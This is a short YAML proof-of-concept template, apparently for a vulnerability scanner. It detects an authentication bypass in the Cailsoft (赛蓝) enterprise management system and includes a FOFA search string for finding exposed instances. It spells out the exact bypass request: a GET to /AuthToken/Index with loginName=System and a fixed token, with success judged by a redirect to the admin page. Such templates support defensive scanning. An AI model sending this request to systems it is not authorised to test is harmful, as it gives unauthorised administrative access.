id: poc-yaml-cailsoft-authtoken-identity-authentication-bypass
info:
  name: 赛蓝企业管理系统 AuthToken 身份认证绕过漏洞
  severity: medium
  tags:
  - 认证绕过
  finger: 企业管理系统
  fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"赛蓝（广州）信息技术有限公司")
- method: GET
  path: /AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f
  expression: "status_code == 302 && \ncontains(body,`href=\"/Home6/AdminPretty\"\
    `) &&\ncontains(headers,\"Location: /Home6/AdminPretty\")\n"
variables: {}
transport: http
